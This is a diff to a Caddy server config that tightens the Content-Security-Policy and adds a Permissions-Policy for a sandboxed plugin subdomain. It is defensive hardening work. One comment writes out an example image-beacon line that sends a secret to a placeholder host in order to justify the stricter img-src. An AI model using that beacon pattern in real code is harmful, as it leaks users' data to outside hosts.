@@ -20,10 +20,17 @@ doot.games {
 plugins.doot.games {
 	encode zstd gzip
 	header {
-		# connect-src 'none' is the load-bearing control: a malicious plugin
-		# cannot phone home or exfiltrate the room. frame-ancestors lets only
+		# connect-src 'none' blocks fetch/XHR/WebSocket. But it is NOT "can't
+		# exfiltrate" on its own: any allowed remote img-src is a beacon channel
+		# (new Image().src = 'https://host/?d=' + secret). So img-src is 'self'
+		# + data: only — platform media is handed to the plugin over the bridge,
+		# never as a fetchable URL the plugin builds. frame-ancestors lets only
 		# Doot embed it. Reviewed plugins may later widen connect-src per manifest.
-		Content-Security-Policy "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://media.doot.games; connect-src 'none'; frame-ancestors https://doot.games; base-uri 'none'; form-action 'none'"
+		Content-Security-Policy "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; frame-ancestors https://doot.games; base-uri 'none'; form-action 'none'"
+		# Deny powerful features as defense-in-depth (the sandbox already blocks
+		# most; this is cheap and explicit). Not X-Frame-Options: it can't allow a
+		# cross-origin ancestor, and frame-ancestors above is the correct control.
+		Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=(), hid=(), midi=(), accelerometer=(), gyroscope=(), magnetometer=()"
 		X-Content-Type-Options "nosniff"
 		Cross-Origin-Opener-Policy "same-origin"
 		Cross-Origin-Resource-Policy "same-site"
